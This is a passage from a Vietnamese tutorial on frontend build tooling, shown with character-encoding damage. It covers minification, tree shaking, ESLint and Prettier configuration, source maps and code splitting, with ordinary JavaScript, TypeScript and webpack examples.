â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                          â”‚
â”‚  ğŸ“¦ React App Example (Production build):               â”‚
â”‚                                                          â”‚
â”‚  BEFORE Minify:                                         â”‚
â”‚  â”œâ”€â”€ main.js:          850 KB (code dá»… Ä‘á»c)            â”‚
â”‚  â”œâ”€â”€ vendor.js:        1.2 MB (libraries)              â”‚
â”‚  â””â”€â”€ Total:            2.05 MB                          â”‚
â”‚                                                          â”‚
â”‚  AFTER Minify:                                          â”‚
â”‚  â”œâ”€â”€ main.min.js:      280 KB (67% nhá» hÆ¡n!) âœ…        â”‚
â”‚  â”œâ”€â”€ vendor.min.js:    420 KB (65% nhá» hÆ¡n!) âœ…        â”‚
â”‚  â””â”€â”€ Total:            700 KB                           â”‚
â”‚                                                          â”‚
â”‚  AFTER Minify + Gzip:                                   â”‚
â”‚  â”œâ”€â”€ main.min.js.gz:   95 KB (89% nhá» hÆ¡n!) ğŸš€         â”‚
â”‚  â”œâ”€â”€ vendor.min.js.gz: 145 KB (88% nhá» hÆ¡n!) ğŸš€        â”‚
â”‚  â””â”€â”€ Total:            240 KB                           â”‚
â”‚                                                          â”‚
â”‚  â±ï¸ Load Time Impact (3G network ~400 KB/s):           â”‚
â”‚  â”œâ”€â”€ Before: 2.05 MB Ã· 400 KB/s = 5.1 giÃ¢y âŒ          â”‚
â”‚  â”œâ”€â”€ After Minify: 700 KB Ã· 400 KB/s = 1.75 giÃ¢y âœ…    â”‚
â”‚  â””â”€â”€ After Minify+Gzip: 240 KB Ã· 400 KB/s = 0.6 giÃ¢y ğŸš€â”‚
â”‚                                                          â”‚
â”‚  ğŸ“ˆ Cáº£i thiá»‡n: Nhanh hÆ¡n 8.5x!                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

**ğŸ“š Pháº§n 3: Tree Shaking (Loáº¡i Bá» Code Thá»«a) - RÅ© CÃ¢y**

#### **ğŸ’¡ Tree Shaking LÃ  GÃ¬?**

**Tree Shaking** lÃ  quÃ¡ trÃ¬nh **loáº¡i bá» dead code** (code khÃ´ng Ä‘Æ°á»£c sá»­ dá»¥ng) khá»i bundle. TÃªn gá»i "rÅ© cÃ¢y" vÃ¬ giá»‘ng nhÆ° rÅ© cÃ¢y Ä‘á»ƒ lÃ¡ cháº¿t rÆ¡i xuá»‘ng.

**ğŸŒ² CÃ¡ch Hoáº¡t Äá»™ng:**

```typescript
// ===================================================
// ğŸ“¦ LIBRARY: math-utils.js (ThÆ° viá»‡n toÃ¡n há»c)
// ===================================================

// Export 10 functions (nhÆ°ng app chá»‰ dÃ¹ng 2)
export function add(a, b) {
  return a + b;
}

export function subtract(a, b) {
  return a - b;
}

export function multiply(a, b) {
  return a * b;
}

export function divide(a, b) {
  return a / b;
}

export function power(a, b) {
  return Math.pow(a, b);
}

export function sqrt(a) {
  return Math.sqrt(a);
}

export function abs(a) {
  return Math.abs(a);
}

export function round(a) {
  return Math.round(a);
}

export function floor(a) {
  return Math.floor(a);
}

export function ceil(a) {
  return Math.ceil(a);
}

// ===================================================
// ğŸ“± APP: index.js (Chá»‰ dÃ¹ng 2 functions)
// ===================================================

import { add, subtract } from './math-utils.js';
//       â†‘      â†‘
//       Chá»‰ import 2 functions (add, subtract)
//       8 functions cÃ²n láº¡i KHÃ”NG import

const result1 = add(10, 20);        // âœ… DÃ¹ng add
const result2 = subtract(50, 30);   // âœ… DÃ¹ng subtract

console.log(result1, result2);

// ===================================================
// ğŸŒ² TREE SHAKING RESULT (Káº¿t quáº£ sau tree shake)
// ===================================================

// âŒ KHÃ”NG DÃ™NG Tree Shaking:
// Bundle chá»©a Táº¤T Cáº¢ 10 functions (ká»ƒ cáº£ 8 functions khÃ´ng dÃ¹ng)
// Bundle size: ~2 KB

// âœ… DÃ™NG Tree Shaking:
// Bundle CHá»ˆ chá»©a 2 functions (add, subtract)
// 8 functions cÃ²n láº¡i bá»‹ LOáº I Bá» hoÃ n toÃ n
// Bundle size: ~400 bytes

// ğŸ“Š Giáº£m 80% kÃ­ch thÆ°á»›c! ğŸš€
```

**ğŸ” Tree Shaking Deep Dive - PhÃ¢n TÃ­ch Chi Tiáº¿t:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         TREE SHAKING PROCESS (Quy trÃ¬nh rÅ© cÃ¢y)          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                          â”‚
â”‚  ğŸŒ³ STEP 1: Build Dependency Tree (XÃ¢y cÃ¢y phá»¥ thuá»™c)  â”‚
â”‚                                                          â”‚
â”‚         index.js (Entry)                                â”‚
â”‚            â”‚                                             â”‚
â”‚            â”œâ”€ import { add, subtract } from math-utils  â”‚
â”‚            â”‚                                             â”‚
â”‚         math-utils.js                                   â”‚
â”‚            â”œâ”€ export add âœ… (USED - Ä‘Æ°á»£c dÃ¹ng)          â”‚
â”‚            â”œâ”€ export subtract âœ… (USED - Ä‘Æ°á»£c dÃ¹ng)     â”‚
â”‚            â”œâ”€ export multiply âŒ (UNUSED - khÃ´ng dÃ¹ng)  â”‚
â”‚            â”œâ”€ export divide âŒ (UNUSED)                 â”‚
â”‚            â”œâ”€ export power âŒ (UNUSED)                  â”‚
â”‚            â”œâ”€ export sqrt âŒ (UNUSED)                   â”‚
â”‚            â”œâ”€ export abs âŒ (UNUSED)                    â”‚
â”‚            â”œâ”€ export round âŒ (UNUSED)                  â”‚
â”‚            â”œâ”€ export floor âŒ (UNUSED)                  â”‚
â”‚            â””â”€ export ceil âŒ (UNUSED)                   â”‚
â”‚                                                          â”‚
â”‚  âœ‚ï¸ STEP 2: Mark Unused Exports (ÄÃ¡nh dáº¥u khÃ´ng dÃ¹ng)  â”‚
â”‚  â”œâ”€â”€ Scan táº¥t cáº£ imports trong app                     â”‚
â”‚  â”œâ”€â”€ ÄÃ¡nh dáº¥u exports nÃ o Ä‘Æ°á»£c import                  â”‚
â”‚  â””â”€â”€ Exports KHÃ”NG Ä‘Æ°á»£c import = UNUSED (thá»«a)         â”‚
â”‚                                                          â”‚
â”‚  ğŸ—‘ï¸ STEP 3: Remove Dead Code (XÃ³a code thá»«a)          â”‚
â”‚  â”œâ”€â”€ Loáº¡i bá» 8 functions khÃ´ng dÃ¹ng                    â”‚
â”‚  â”œâ”€â”€ Chá»‰ giá»¯ láº¡i add vÃ  subtract                       â”‚
â”‚  â””â”€â”€ Bundle size: 2 KB â†’ 400 bytes                     â”‚
â”‚                                                          â”‚
â”‚  âœ… OUTPUT: Optimized bundle (Bundle tá»‘i Æ°u)           â”‚
â”‚  â””â”€â”€ Chá»‰ chá»©a code THá»°C Sá»° Ä‘Æ°á»£c dÃ¹ng                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**âš ï¸ Äiá»u Kiá»‡n Äá»ƒ Tree Shaking Hoáº¡t Äá»™ng:**

```typescript
// ===================================================
// âœ… YÃŠU Cáº¦U 1: DÃ¹ng ES Modules (import/export)
// ===================================================

// âœ… GOOD: ES Modules - Tree shaking hoáº¡t Ä‘á»™ng
export function add(a, b) {
  return a + b;
}

import { add } from './utils.js';

// âŒ BAD: CommonJS - Tree shaking KHÃ”NG hoáº¡t Ä‘á»™ng
module.exports = {
  add: function(a, b) { return a + b; }
};

const { add } = require('./utils.js');

// ğŸ” Táº I SAO?
// ES Modules: Static imports (biáº¿t lÃºc build time exports nÃ o Ä‘Æ°á»£c dÃ¹ng)
// CommonJS: Dynamic requires (chá»‰ biáº¿t lÃºc runtime â†’ khÃ´ng tree shake Ä‘Æ°á»£c)

// ===================================================
// âœ… YÃŠU Cáº¦U 2: sideEffects: false trong package.json
// ===================================================

// package.json
{
  "name": "my-library",
  "sideEffects": false, // âœ… BÃ¡o: "Safe to remove unused exports"
}

// Hoáº·c chá»‰ Ä‘á»‹nh files cÃ³ side-effects:
{
  "sideEffects": [
    "*.css",           // CSS files cÃ³ side-effects (apply styles globally)
    "*.scss",
    "./src/polyfills.ts" // Polyfills cÃ³ side-effects (modify globals)
  ]
}

// ğŸ” SIDE-EFFECTS LÃ€ GÃŒ?
// Code cÃ³ tÃ¡c dá»¥ng phá»¥ khi import (khÃ´ng chá»‰ export functions/classes)

// âŒ Code cÃ³ side-effects (KHÃ”NG tree shake Ä‘Æ°á»£c):
// logger.js
console.log('Logger initialized'); // âš ï¸ Side-effect: console.log khi import
window.logger = { log: (msg) => console.log(msg) }; // âš ï¸ Modify global

export function log(message) {
  console.log(message);
}

// App import logger:
import { log } from './logger.js';
// â†’ logger.js Ä‘Æ°á»£c execute ngay láº­p tá»©c
// â†’ console.log('Logger initialized') cháº¡y
// â†’ window.logger Ä‘Æ°á»£c táº¡o
// â†’ Bundler KHÃ”NG DÃM xÃ³a code nÃ y (vÃ¬ cÃ³ side-effects)

// âœ… Code KHÃ”NG cÃ³ side-effects (tree shake Ä‘Æ°á»£c):
// math.js
export function add(a, b) {
  return a + b; // âœ… Pure function - khÃ´ng side-effects
}

// ===================================================
// âœ… YÃŠU Cáº¦U 3: Named Exports (khÃ´ng dÃ¹ng default export)
// ===================================================

// âŒ BAD: Default export + destructuring â†’ Tree shake KÃ‰M
// utils.js
export default {
  add: (a, b) => a + b,
  subtract: (a, b) => a - b,
  multiply: (a, b) => a * b,
};

// app.js
import utils from './utils.js';
const result = utils.add(1, 2);
// ğŸš¨ Bundler pháº£i include TOÃ€N Bá»˜ object (vÃ¬ khÃ´ng biáº¿t property nÃ o Ä‘Æ°á»£c dÃ¹ng)

// âœ… GOOD: Named exports â†’ Tree shake Tá»T
// utils.js
export const add = (a, b) => a + b;
export const subtract = (a, b) => a - b;
export const multiply = (a, b) => a * b;

// app.js
import { add } from './utils.js';
const result = add(1, 2);
// âœ… Bundler chá»‰ include add, loáº¡i bá» subtract vÃ  multiply

// ===================================================
// âŒ ANTI-PATTERN: Barrel Exports (Re-exports)
// ===================================================

// âŒ BAD: Barrel file (index.js) re-export táº¥t cáº£
// index.js
export * from './moduleA'; // Re-export táº¥t cáº£ tá»« moduleA
export * from './moduleB';
export * from './moduleC';

// app.js
import { funcA } from './index.js'; // Import tá»« barrel
// ğŸš¨ Bundler pháº£i load Táº¤T Cáº¢ modules (A, B, C)
// VÃ¬ barrel file cÃ³ thá»ƒ cÃ³ side-effects

// âœ… GOOD: Import trá»±c tiáº¿p
import { funcA } from './moduleA.js';
// âœ… Chá»‰ load moduleA, khÃ´ng load B vÃ  C
```

**ğŸ¯ Real-World Tree Shaking Example:**

```typescript
// ===================================================
// ğŸ“¦ VÃ Dá»¤ THá»°C Táº¾: Lodash Library
// ===================================================

// âŒ BAD: Import toÃ n bá»™ Lodash (~70 KB!)
import _ from 'lodash';

const result = _.uniq([1, 2, 2, 3]);
// ğŸš¨ Bundle bao gá»“m TOÃ€N Bá»˜ Lodash (300+ functions)
// â†’ Bundle size: +70 KB

// âœ… GOOD: Import chá»‰ function cáº§n dÃ¹ng
import uniq from 'lodash/uniq'; // Chá»‰ import uniq function

const result = uniq([1, 2, 2, 3]);
// âœ… Bundle chá»‰ bao gá»“m uniq function (~2 KB)
// â†’ Bundle size: +2 KB

// ğŸ“Š Tiáº¿t kiá»‡m: 68 KB! (97% nhá» hÆ¡n)

// âœ… BETTER: DÃ¹ng lodash-es (ES Modules version)
import { uniq } from 'lodash-es';
// â†’ Tree shaking tá»± Ä‘á»™ng loáº¡i bá» functions khÃ´ng dÃ¹ng
```

---

**ğŸ“š Pháº§n 4: Code Splitting, ESLint/Prettier, Source Maps**

CÃ¡c cÃ´ng cá»¥ quan trá»ng trong frontend development:

1. **ESLint/Prettier** - Code Quality & Formatting

   - **ESLint**: Linter - phÃ¡t hiá»‡n lá»—i, enforce coding standards
   - **Prettier**: Formatter - format code tá»± Ä‘á»™ng, giá»¯ style nháº¥t quÃ¡n
   - **TÃ­ch há»£p**: ESLint check logic + Prettier format code

2. **Source Maps** - Debugging

   - Map tá»« minified/transpiled code â†’ original source code
   - Debug trong browser nhÆ° code gá»‘c (trÆ°á»›c build)
   - Xem line numbers, variable names chÃ­nh xÃ¡c

3. **Code Splitting** - Performance Optimization
   - Chia bundle thÃ nh nhiá»u chunks nhá»
   - Load code khi cáº§n (lazy loading)
   - Cáº£i thiá»‡n initial load time

**Hoáº¡t Ä‘á»™ng:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                   TOOLING WORKFLOW                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                             â”‚
â”‚  1. DEVELOPMENT (ESLint + Prettier)                        â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                  â”‚
â”‚  â”‚  Write code                          â”‚                  â”‚
â”‚  â”‚    â†“                                 â”‚                  â”‚
â”‚  â”‚  ESLint check (errors, warnings)    â”‚                  â”‚
â”‚  â”‚    â†“                                 â”‚                  â”‚
â”‚  â”‚  Prettier format (auto-fix)         â”‚                  â”‚
â”‚  â”‚    â†“                                 â”‚                  â”‚
â”‚  â”‚  Clean, consistent code âœ…           â”‚                  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚
â”‚                                                             â”‚
â”‚  2. BUILD (Bundling â†’ Tree-shaking â†’ Minify â†’ Split)      â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                  â”‚
â”‚  â”‚  Source code (100 files, 500 KB)    â”‚                  â”‚
â”‚  â”‚    â†“                                 â”‚                  â”‚
â”‚  â”‚  Bundling (gá»™p thÃ nh 1 file)        â”‚                  â”‚
â”‚  â”‚    â†“                                 â”‚                  â”‚
â”‚  â”‚  Bundle (1 file, 500 KB)            â”‚                  â”‚
â”‚  â”‚    â†“                                 â”‚                  â”‚
â”‚  â”‚  Tree-shaking (loáº¡i code thá»«a)      â”‚                  â”‚
â”‚  â”‚    â†“                                 â”‚                  â”‚
â”‚  â”‚  Used code (300 KB) âœ…               â”‚                  â”‚
â”‚  â”‚    â†“                                 â”‚                  â”‚
â”‚  â”‚  Minify (nÃ©n code)                  â”‚                  â”‚
â”‚  â”‚    â†“                                 â”‚                  â”‚
â”‚  â”‚  Minified (100 KB) âœ…                â”‚                  â”‚
â”‚  â”‚    â†“                                 â”‚                  â”‚
â”‚  â”‚  Code splitting (tÃ¡ch chunks)       â”‚                  â”‚
â”‚  â”‚    â†“                                 â”‚                  â”‚
â”‚  â”‚  main.js (30KB) + vendor.js (40KB) +â”‚                  â”‚
â”‚  â”‚  lazy-1.js (15KB) + lazy-2.js (15KB)â”‚                  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚
â”‚                                                             â”‚
â”‚  3. PRODUCTION (Source Maps)                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                  â”‚
â”‚  â”‚  Minified code (app.min.js)         â”‚                  â”‚
â”‚  â”‚    + Source map (app.min.js.map)    â”‚                  â”‚
â”‚  â”‚    â†“                                 â”‚                  â”‚
â”‚  â”‚  User opens DevTools                â”‚                  â”‚
â”‚  â”‚    â†“                                 â”‚                  â”‚
â”‚  â”‚  Browser loads source map           â”‚                  â”‚
â”‚  â”‚    â†“                                 â”‚                  â”‚
â”‚  â”‚  Debug vá»›i original code âœ…          â”‚                  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Æ¯u Ä‘iá»ƒm:**

- âœ… **Bundling**: 100 requests â†’ 1 request, giáº£m latency 100x
- âœ… **Minify**: Giáº£m 60-70% kÃ­ch thÆ°á»›c file (850KB â†’ 280KB)
- âœ… **Tree-shaking**: Loáº¡i bá» dead code, giáº£m 30-50% bundle size
- âœ… **ESLint**: Catch bugs sá»›m, enforce best practices
- âœ… **Prettier**: KhÃ´ng tranh cÃ£i vá» code style, tá»± Ä‘á»™ng format
- âœ… **Source Maps**: Debug dá»… dÃ ng nhÆ° development mode
- âœ… **Code Splitting**: Initial load nhanh hÆ¡n, better UX

**NhÆ°á»£c Ä‘iá»ƒm:**

- âŒ **Bundling**: Build time cháº­m hÆ¡n (pháº£i gá»™p files)
- âŒ **Minify**: Code khÃ³ Ä‘á»c (cáº§n source maps Ä‘á»ƒ debug)
- âŒ **Tree-shaking**: KhÃ´ng hoáº¡t Ä‘á»™ng vá»›i CommonJS, side-effects
- âŒ **ESLint**: Cáº¥u hÃ¬nh phá»©c táº¡p, rules conflict
- âŒ **Prettier**: ÄÃ´i khi format khÃ´ng nhÆ° Ã½ muá»‘n
- âŒ **Source Maps**: File .map tÄƒng bandwidth (nÃªn serve riÃªng)
- âŒ **Code Splitting**: Phá»©c táº¡p hÆ¡n, nhiá»u HTTP requests

**ChÃº thÃ­ch:**

**ğŸ“¦ Bundling Best Practices:**

- **Webpack**: Bundler phá»• biáº¿n nháº¥t, nhiá»u features
- **Vite**: Bundler má»›i, cá»±c nhanh (dÃ¹ng esbuild)
- **Rollup**: Tá»‘t cho libraries (tree-shaking xuáº¥t sáº¯c)

**ğŸ—œï¸ Minify Tools:**

- **Terser**: Minifier tá»‘t nháº¥t cho JavaScript (default trong Webpack 5)
- **esbuild**: Cá»±c nhanh (Golang), dÃ¹ng trong Vite
- **UglifyJS**: CÅ© hÆ¡n, cháº­m hÆ¡n (deprecated)

**ğŸŒ² Tree-shaking Tips:**

- **YÃªu cáº§u**: ESM (`import/export`), khÃ´ng dÃ¹ng CommonJS (`require`)
- **`sideEffects: false`**: BÃ¡o cho bundler biáº¿t "safe to remove unused exports"
- **Side-effects**: Code cÃ³ tÃ¡c dá»¥ng phá»¥ (global variables, CSS imports, polyfills...)

**ğŸ” ESLint vs Prettier:**

- **ESLint**: Táº­p trung vÃ o **logic** (unused vars, missing return, potential bugs...)
- **Prettier**: Táº­p trung vÃ o **formatting** (spaces, quotes, line breaks...)
- **TÃ­ch há»£p**: `eslint-config-prettier` táº¯t ESLint formatting rules â†’ khÃ´ng conflict

**ğŸ—ºï¸ Source Maps:**

- Development: `devtool: 'eval-source-map'` (fast rebuild)
- Production: `devtool: 'source-map'` (separate .map file)
- **Hidden source maps**: Deploy .map riÃªng, khÃ´ng public â†’ báº£o máº­t source code

**âœ‚ï¸ Code Splitting:**

- **Route-based**: Split theo routes (React Router, Vue Router)
- **Component-based**: Lazy load components náº·ng (React.lazy, Vue defineAsyncComponent)
- **Vendor splitting**: TÃ¡ch libraries (React, Lodash...) ra vendor chunk

---

**Code Example (TypeScript):**

```typescript
// ============================================
// 1. ESLint + Prettier Configuration
// ============================================

// .eslintrc.js
module.exports = {
  root: true,
  parser: '@typescript-eslint/parser',
  parserOptions: {
    ecmaVersion: 2022,
    sourceType: 'module',
    project: './tsconfig.json'
  },
  plugins: ['@typescript-eslint', 'react', 'react-hooks'],
  extends: [
    'eslint:recommended',                          // ESLint base rules
    'plugin:@typescript-eslint/recommended',       // TypeScript rules
    'plugin:react/recommended',                    // React rules
    'plugin:react-hooks/recommended',              // React Hooks rules
    'prettier'                                     // Disable formatting rules (conflict vá»›i Prettier)
  ],
  rules: {
    // Customize rules
    '@typescript-eslint/no-unused-vars': 'error',  // âŒ Error khi cÃ³ unused vars
    '@typescript-eslint/explicit-function-return-type': 'warn', // âš ï¸ Warning khi khÃ´ng cÃ³ return type
    'react/prop-types': 'off',                     // âœ… Táº¯t (vÃ¬ dÃ¹ng TypeScript)
    'no-console': 'warn',                          // âš ï¸ Warning vá»›i console.log
  }
};

// .prettierrc.js
module.exports = {
  semi: true,                    // ThÃªm semicolon
  singleQuote: true,             // DÃ¹ng single quotes
  tabWidth: 2,                   // 2 spaces
  trailingComma: 'es5',          // Trailing comma cho ES5
  printWidth: 100,               // Max line length
  arrowParens: 'avoid',          // (x) => x thay vÃ¬ (x) => x
  endOfLine: 'lf'                // Unix line endings
};

// package.json scripts
{
  "scripts": {
    "lint": "eslint . --ext .ts,.tsx",                    // Check lá»—i
    "lint:fix": "eslint . --ext .ts,.tsx --fix",          // Auto-fix lá»—i
    "format": "prettier --write \"**/*.{ts,tsx,json}\"",  // Format code
    "format:check": "prettier --check \"**/*.{ts,tsx,json}\"" // Check format
  }
}

// ============================================
// 2. Source Maps Configuration
// ============================================

// webpack.config.js
module.exports = {
  mode: 'production',

  // ğŸ—ºï¸ Source maps cho production
  devtool: 'source-map', // Táº¡o file .map riÃªng

  // Alternative options:
  // devtool: 'hidden-source-map' â†’ KhÃ´ng reference trong bundle (báº£o máº­t hÆ¡n)
  // devtool: 'eval-source-map'   â†’ Development (rebuild nhanh)
  // devtool: 'cheap-source-map'  â†’ Faster build, less accurate

  output: {
    filename: '[name].[contenthash].js',
    path: path.resolve(__dirname, 'dist'),

    // ğŸ”’ Serve source maps tá»« private server (optional)
    sourceMapFilename: '[file].map',
    publicPath: 'https://sourcemaps.example.com/'
  }
};

// tsconfig.json
{
  "compilerOptions": {
    "sourceMap": true,  // Generate .map files cho TypeScript
    "inlineSources": true // Include source code trong .map (debugging easier)
  }
}

// ğŸ¯ Sá»­ dá»¥ng: Debug trong browser
// 1. Open DevTools
// 2. Source maps tá»± Ä‘á»™ng load
// 3. Set breakpoint trong ORIGINAL TypeScript code
// 4. Xem variables vá»›i original names (khÃ´ng bá»‹ minified)

// ============================================
// 3. Tree-shaking Setup
// ============================================

// package.json
{
  "name": "my-app",
  "sideEffects": false, // âœ… BÃ¡o cho bundler: "safe to remove unused exports"

  // Hoáº·c specify files cÃ³ side-effects:
  // "sideEffects": ["*.css", "*.scss", "./src/polyfills.ts"]
}

// âœ… GOOD: Named exports cho tree-shaking
// utils.ts
export function add(a: number, b: number): number {
  return a + b;
}

export function subtract(a: number, b: number): number {
  return a - b;
}

export function multiply(a: number, b: number): number {
  return a * b;
}

// app.ts
import { add } from './utils'; // âœ… Chá»‰ import add

console.log(add(2, 3));

// ğŸŒ² Tree-shaking result:
// subtract() vÃ  multiply() Bá»Š LOáº I Bá» khá»i bundle!
// Bundle chá»‰ chá»©a add() â†’ nhá» hÆ¡n

// âŒ BAD: Default export + namespace import â†’ tree-shaking KÃ‰M
// utils.ts
export default {
  add: (a, b) => a + b,
  subtract: (a, b) => a - b,
  multiply: (a, b) => a * b
};

// app.ts
import utils from './utils'; // âŒ Import Cáº¢ object
console.log(utils.add(2, 3));
// ğŸš¨ Tree-shaking KHÃ”NG hoáº¡t Ä‘á»™ng!
// Bundle chá»©a cáº£ subtract, multiply (dÃ¹ khÃ´ng dÃ¹ng)

// âŒ BAD: Barrel exports vá»›i side-effects
// index.ts (barrel file)
export * from './moduleA'; // âŒ Náº¿u moduleA cÃ³ side-effects
export * from './moduleB';
export * from './moduleC';

// app.ts
import { funcA } from './index'; // Import from barrel
// ğŸš¨ Bundler pháº£i load Táº¤T Cáº¢ modules (A, B, C)
// VÃ¬ khÃ´ng biáº¿t module nÃ o cÃ³ side-effects

// âœ… GOOD: Import trá»±c tiáº¿p
import { funcA } from './moduleA'; // âœ… Chá»‰ load moduleA

// ============================================
// 4. Code Splitting
// ============================================

// ğŸ“ A. Route-based Code Splitting (React Router)
import { lazy, Suspense } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

// âœ… Lazy load route components
const Home = lazy(() => import('./pages/Home'));        // home.chunk.js
const Dashboard = lazy(() => import('./pages/Dashboard')); // dashboard.chunk.js
const Profile = lazy(() => import('./pages/Profile'));  // profile.chunk.js

function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<div>Loading...</div>}>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/dashboard" element={<Dashboard />} />
          <Route path="/profile" element={<Profile />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}

// ğŸ¯ Káº¿t quáº£:
// - Initial load: Chá»‰ load main.js + home.chunk.js
// - User vÃ o /dashboard â†’ Load dashboard.chunk.js on-demand
// - User vÃ o /profile â†’ Load profile.chunk.js on-demand

// ğŸ“¦ B. Component-based Code Splitting
// Heavy component (Chart library)
const ChartComponent = lazy(() => import('./components/Chart'));

function Dashboard() {
  const [showChart, setShowChart] = React.useState(false);

  return (
    <div>
      <button onClick={() => setShowChart(true)}>Show Chart</button>

      {showChart && (
        <Suspense fallback={<div>Loading chart...</div>}>
          <ChartComponent /> {/* Load khi click button */}
        </Suspense>
      )}
    </div>
  );
}

// ğŸ¯ Lá»£i Ã­ch: Chart library (VD: 500KB) chá»‰ load khi user click

// ğŸ”§ C. Dynamic Import (Vanilla JS)
async function loadHeavyModule() {
  const module = await import('./heavy-module'); // Load on-demand
  module.doSomething();
}

// Example: Load trading calculator khi cáº§n
document.getElementById('calculate-btn')?.addEventListener('click', async () => {
  // Load calculator module (chá»©a complex math logic)
  const { calculateProfit } = await import('./trading-calculator');

  const result = calculateProfit(100, 150);
  console.log(result);
});

// ğŸ“Š D. Vendor Splitting (Webpack)
// webpack.config.js
module.exports = {
  optimization: {
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        // TÃ¡ch React vÃ o vendor chunk
        vendor: {
          test: /[\\/]node_modules[\\/](react|react-dom)[\\/]/,
          name: 'vendor',
          priority: 10
        },
        // TÃ¡ch libraries khÃ¡c
        libs: {
          test: /[\\/]node_modules[\\/]/,
          name: 'libs',
          priority: 5
        }
      }
    }
  }
};

// ğŸ¯ Káº¿t quáº£:
// - vendor.js (React + ReactDOM) â†’ cache lÃ¢u dÃ i (Ã­t thay Ä‘á»•i)
// - libs.js (Lodash, Axios...) â†’ cache lÃ¢u dÃ i
// - main.js (App code) â†’ thay Ä‘á»•i thÆ°á»ng xuyÃªn

// ============================================
// 5. Content Hashing (Hash File) - Cache Busting
// ============================================

/**
 * ğŸ” CONTENT HASHING LÃ€ GÃŒ? (What is Content Hashing?)
 * 
 * Content Hashing lÃ  ká»¹ thuáº­t thÃªm HASH (chuá»—i kÃ½ tá»± duy nháº¥t) vÃ o tÃªn file
 * dá»±a trÃªn Ná»˜I DUNG cá»§a file. Khi ná»™i dung thay Ä‘á»•i â†’ hash thay Ä‘á»•i â†’ tÃªn file má»›i.
 * 
 * ğŸ¯ Má»¤C ÄÃCH:
